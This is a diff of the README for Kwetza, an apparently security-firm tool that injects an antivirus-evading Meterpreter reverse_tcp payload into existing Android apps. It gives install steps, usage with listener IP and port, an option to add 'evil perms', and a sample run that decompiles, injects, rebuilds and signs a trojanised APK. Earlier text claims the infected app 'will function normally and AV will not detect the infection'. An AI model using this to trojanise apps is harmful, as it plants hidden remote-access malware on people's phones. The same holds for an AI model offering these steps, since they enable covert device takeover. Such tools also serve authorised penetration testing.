@@ -1,30 +1,77 @@
-KWETZA
-===
-Use this script to infect any existing Android application with a FUD meterpreter payload (reverse_tcp).  Have phun.
+#Introduction
+By Chris Le Roy (@bromwpnie) chris@sensepost.com
 
-BASIC USAGE
-===
-python kwetza.py nameOfTheApkToInfect.apk LHOST LPORT yes
+Kwetza is a tool that allows you to infect an existing Android application with a Meterpreter payload.
 
-targetApk.apk=name of the APK you wish to infect.
-LHOST=IP of your listener.
-LPORT=Port of your listener.
-yes=include "yes" to inject additional evil perms into the app, exclude/leave blank to utilize the default permissions of the app.
+#What does it do?
+Kwetza infects an existing Android application with either custom or default payload templates to avoid detection by antivirus. Kwetza allows you to infect Android applications using the target application's default permissions or inject additional permissons to gain additional functionality.
 
-INFORMATION
-===
-The infected app will function normally and AV will not detect the infection. NB, this tool relies on apktool to be installed and accesible via your PATH.
-Follow these instructions to setup apktool, https://ibotpeaches.github.io/Apktool/install/.
-Kwetza also assumes that apktool will create and place your decompiled APK into the directory you are running kwetza.py from. Kwetza uses apktool defaults 
-which are sufficient to achieve infection.
+#Getting the code
+
+Firstly get the code:
+```
+git clone https://github.com/sensepost/kwetza.git
+```
+
+Kwetza is written in Python and requires BeautfiulSoup which can be installed using Pip:
+```
+pip install beautifulsoup4
+```
+Kwetza requires Apktool to be install and accessible via your PATH. This can be setup using the install instructions located here: https://ibotpeaches.github.io/Apktool/install
+
+#Usage
+
+python kwetza.py nameOfTheApkToInfect.apk LHOST LPORT yes/no
+
+* nameOfTheApkToInfect.apk =name of the APK you wish to infect.
+* LHOST =IP of your listener.
+* LPORT =Port of your listener.
+* yes =include "yes" to inject additional evil perms into the app, "no" to utilize the default permissions of the app.
+
+```
+python kwetza.py hackme.apk 10.42.0.118 4444 yes
+[+] MMMMMM KWETZA
+[*] DECOMPILING TARGET APK
+[+] ENDPOINT IP: 10.42.0.118
+[+] ENDPOINT PORT: 4444
+[+] APKTOOL DECOMPILED SUCCESS
+[*] BYTING COMMS...
+[*] ANALYZING ANDROID MANIFEST...
+[+] TARGET ACTIVITY: com.foo.moo.gui.MainActivity
+[*] INJECTION INTO APK
+[+] CHECKING IF ADDITIONAL PERMS TO BE ADDED
+[*] INJECTION OF CRAZY PERMS TO BE DONE!
+[+] TIME TO BUILD INFECTED APK
+[*] EXECUTING APKTOOL BUILD COMMAND
+[+] BUILD RESULT
+############################################
+I: Using APktool 2.2.0
+I: Checking whether source shas changed...
+I: Smaling smali folder into classes.dex
+I: Checking whether resources has changed...
+I: Building resources...
+I: Copying libs ...(/lib)
+I: Building apk file...
+I: Copying unknown files/dir...
+###########################################
+[*] EXECUTING JARSIGNER COMMAND...
+Enter Passphrase for keystore: password
+[+] JARSIGNER RESULT
+###########################################
+jar signed.
+
+###########################################
+
+[+] L00t located at hackme/dist/hackme.apk
+```
+
+
+#Information
+
 Kwetza by default will use the template and keystore located in the folder "payload" to inject and sign the infected apk. If you would like to sign the
 infected application with your own certificate, generate a new keystore and place it in the "payload" folder and rename to the existing keystore or change the 
-reference in the kwetza.py. The password for the default keystore is, well, password.
+reference in the kwetza.py. The same can be done for payload templates. The password for the default keystore is, well, "password".
 
-KNOWN BUGS
-===
-Make sure to place yout target APK in the same location as kwetza.py :)
+#License
 
-License
-===
-Jack is licensed under a Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License (http://creativecommons.org/licenses/by-nc-sa/4.0) Permissions beyond the scope of this license may be available at http://sensepost.com/contact us/.
+Kwetza is licensed under a Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License (http://creativecommons.org/licenses/by-nc-sa/4.0) Permissions beyond the scope of this license may be available at http://sensepost.com/contact.
